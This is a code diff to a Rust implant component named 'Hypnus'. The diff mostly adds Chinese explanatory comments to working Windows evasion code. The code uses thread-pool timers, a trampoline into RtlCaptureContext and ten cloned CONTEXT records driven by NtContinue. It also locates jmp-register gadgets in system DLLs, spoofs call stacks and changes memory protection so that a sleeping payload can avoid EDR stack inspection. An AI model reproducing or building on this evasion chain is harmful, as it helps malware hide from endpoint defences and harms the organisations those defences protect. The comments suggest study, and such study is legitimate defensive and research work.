@@ -302,7 +302,8 @@ impl Hypnus {
             // 指向TP_POOL的句柄:是整个线程池的根,后续所有线程数量/栈大小都通过整个pool指针进行挂载
             let mut pool = null_mut();
 
-            // 创建worker
+            // TpAllocPool在用户态堆区分配并初始化一个TP_POOL结构体,并在内核中创建一个Worker Factory对象.没有产生真正的线程.
+            // 初始化独立的线程池管理实例
             let mut status = TpAllocPool(&mut pool, null_mut());
             if !NT_SUCCESS(status) {
                 bail!(s!("TpAllocPool Failed"));
@@ -334,7 +335,7 @@ impl Hypnus {
             let mut timer_ctx = null_mut();
 
             // CONTEXT_FULL,记录cpu全貌
-            // win64下,P1Home-P6Home是shadow space.P1Home就是rcx.后续当trampoline执行jmp [rcx],由于rcx指向ctx_init.rcx取出来的值就是p1home内容.结果cpu就跳进RtlCaptureContext
+            // win64下,P1Home-P6Home是shadow space.P1Home就是rcx.后续当trampoline执行jmp [rcx],由于rcx指向ctx_init.rcx取出来的值就是p1home内容,即Rtlcapturecntext在ntdll.dll的真实内存地址.结果cpu就跳进RtlCaptureContext
             // 这里只申请内存并预设捕获用到的函数,没有实际捕获状态
             // 主线程在自己stack上开辟了1.2k空间,根据sizeof(CONTEXT)算出来的,没有显式allcoc
             // ctx_init 是一个物理存在的 CONTEXT结构体实例，其核心作用是作为异步获取的 “原始线程状态模板”.即一个硬件状态容器,显示通过异步调用从os偷到合法的线程指纹,随后将其作为蓝图分发给后续的混淆步骤
@@ -348,17 +349,18 @@ impl Hypnus {
             };
 
             // The trampoline is needed because thread pool passes the parameter in RDX, not RCX.要回调RtlCaptureContext,它的第一个参数对应的是线程池唤醒的rdx(即第二参数),所以需要trampoline将rdx移入rcx
-            // 1.唤醒线程池(TpSetTimer)
+            // 唤醒线程池(TpSetTimer)
             // The trampoline moves RDX to RCX and jumps to CONTEXT.P1Home (RtlCaptureContext),
             // ensuring a clean transition with no extra instructions before context capture.
 
             // 在windows内存中注册一个定时器任务对象.TpAllocTimer是纯内存操作,再堆里填好结构体,拿到一个句柄.但任务不会执行,内核甚至不知道它的存在.
             //TpSetTimer才是提交任务.实质是内核系统调用,将TpAllocTimer产生的句柄交给内核的任务队列。只有执行了这一步，内核才会开始倒计时，并在时间到期时通过 IOCP 唤醒线程
             // TpAllocTimer物理实质:：在当前进程的堆内存中，开辟一块空间，填充一个_TP_TIMER 结构体
+            // 这里在内存中注册一个定时器任务对象,后续Tpsettimer后,当定时器到时间后.执行trampoline硬编码,jmp[rcx],才进入RtlCaptureContext
             status = TpAllocTimer(
                 // 输出参数,内核把新创建的的定时器对象TP_TIMER的物理内存地址填入
                 &mut timer_ctx, 
-                // 垫片(跳到这个地址执行)
+                // 垫片(跳到这个地址执行),将trampoline转为原始可变指针(代表一个具体的内存地址)
                 self.cfg.trampoline as *mut c_void, 
                 // 堆栈上定义的CONTEXT
                 &mut ctx_init as *mut _ as *mut c_void, 
@@ -379,9 +381,10 @@ impl Hypnus {
             // 这里代表100ms后执行
             delay.QuadPart = -(100i64 * 10_000);
 
-            // 唤醒线程
+            // 唤醒线程池中线程:TpSetTimer是win线程池api,激活一个已经分配好的定时器对象,并告诉内核什么时候触发
+            // 内核将timer_ctx放入全局定时器列表,delay时间到.主线程继续向下执行,不占用cpu盯着计时器.时间到了执行trampoline中预设的rtlcapturecontext
             TpSetTimer(
-                // 输出参数,在调用TpSetTimer前,已经被TpAllocTimer填入
+                // 输出参数,由tpalloctimer产生,在调用TpSetTimer前,已经被TpAllocTimer填入
                 timer_ctx, 
                 // 唤醒时刻
                 &mut delay, 
@@ -390,7 +393,7 @@ impl Hypnus {
                 // msWindowLength - 时间窗口:允许系统延迟执行的宽限期.0代表只要倒计时一归零，必须立刻发送唤醒信号(实际执行中受硬件时钟终端频率限制(一般15.6ms),除非使用timeBeginPeriod修改系统时钟频率)
                 0);
 
-            // Signal after RtlCaptureContext finishes
+            // Signal after RtlCaptureContext finishes:设置第二个定时器.因为RtlCaptureContext快照后,直接返回,线程继续休眠.第二个定时器设为200ms,去点亮events[0]
             // 初始化新定时器对象TP_TIMER槽位.这里负责发送完成的信号
             let mut timer_event = null_mut();
             //
@@ -399,7 +402,8 @@ impl Hypnus {
                 &mut timer_event,
 
                 // win api:将事件对象从无信号转为有信号 
-                // 如何从外部链接到本项目的?
+                // 如何从外部链接到本项目的:在winapis.rs中有对NtSetEvent2的定义(作为一个封装函数),其内部调用NtSetEvent接收一个event.因为标准的NtSetevent签名与线程池回调签名不匹配.所以才需要wrapper一下
+                // 在混淆逻辑运行时,调用NtSetEvent2的是win线程池的工作线程(worker thread).当线程池触发定时器跳到NtSetEvent2时,工作线程内部会执行给寄存器赋值操作
                 NtSetEvent2 as *mut c_void,
 
                 //  函数开头创建的第一个事件handle
@@ -414,7 +418,7 @@ impl Hypnus {
 
             delay.QuadPart = -(200i64 * 10_000);
             TpSetTimer(timer_event, &mut delay, 0, 0);
-            // 以上,设置两个定时器.因为RtlCaptureContext快照后,直接返回,线程继续休眠.第二个定时器设为200ms,去点亮events[0]
+            
 
 
             // Wait for context capture to complete
@@ -430,13 +434,17 @@ impl Hypnus {
                 bail!(s!("NtWaitForSingleObject Failed"));
             }
 
+            // CONTEXT是执行环境,Config是所需api/rop gadget/堆栈欺骗用到的函数地址
+            // 利用config填充context.
             // Build multi-step spoofed CONTEXT chain
+            // 每个ctx_init都是cpu的瞬时寄存器数据,用于加载到NtContinue,通过Ntcontinue构建config,然后修改config执行指定的函数.这些函数沟通构建  功能
             // 根据上面获取的快照ctx_init,伪造10份.CONTEXT derive copy,这里在内存执行了10此memcpy.即创建了10个一样的执行环境,每个都有该线程池的线程的原始寄存器状态
             let mut ctxs = [ctx_init; 10];
 
             // 将10个ctx_init的rax设为Ntcontinue;且栈变小
+            // 后续每个ctx都是一个cpu快照
             for ctx in &mut ctxs {
-                // 将context中rax设为NtContinue的地址(ntdll中的api).
+                // 通过在 Config.callback 适配器中实现 RDX 到 RCX 的物理平移，配合 ctx.Rax字段存储 NtContinue 地址实现异步循环驱动，同时利用 ctx.Rip与参数寄存器编排原子化的 API 任务，并操纵 Rsp、Rbp 与 Rbx 构建物理断裂的伪造调用栈，最终在系统线程池的离散投影中实现了具备高强度栈欺骗与内存加密能力的隐匿执行链
                 // NtContinue接收一个context,强迫cpu变成context描述的状态
                 ctx.Rax = self.cfg.nt_continue.as_u64();
                 ctx.Rsp -= 8;
@@ -472,14 +480,15 @@ impl Hypnus {
             // Base CONTEXT for spoofing
             ctx_init.Rsp = current_rsp();
 
-            // ctx_init是payload.spoof_context不是针对某个函数/payload的伪造栈,而是伪造了整个回溯链
+            // ctx_init是payload.spoof_context不是针对某个函数/payload的伪造栈,而是伪造了整个回溯链.这里ctx_init提供当前栈顶地址
             // EDR回溯的起点是rsp指向的栈槽位,即使rip里是payload地址,也不影响伪造栈.即,这里从payload之后开始一直伪装到回溯的根部
             let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);
 
             // The chain will wait until `event` is signaled
             // 将该伪造栈帧的 RIP 设置为系统函数NtWaitForSingleObject 的地址。即当该栈帧被“加载”到 CPU时，它就像是一个系统调用
-            //  jmp内部调用Gadget::new,在三个dll中搜索预设的jmp <reg>机器码;jmp内部调用apply()将找到的物理地址与目标api注入到CPONTEXT和寄存器中
+            //  jmp内部调用Gadget::new,在指定dll中搜索预设的jmp <reg>机器码;jmp内部调用apply()将找到的物理地址与目标api注入到CPONTEXT和寄存器中.在之前for ctx中已经将rax设为ntcontinue.后续通过tpsettimer导致ntcontinue被调用,才真正执行
             ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
+            // 遵循win64 fastcall约定,通过寄存器将参数传递给目标函数
             ctxs[0].Rcx = events[1] as u64;
             ctxs[0].Rdx = 0;
             ctxs[0].R8  = 0;
@@ -591,6 +600,7 @@ impl Hypnus {
             ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
 
             // Schedule each CONTEXT via TpSetTimer
+            // 之后所有执行都是在线程池中进行的
             for ctx in &mut ctxs {
                 let mut timer = null_mut();
                 status = TpAllocTimer(
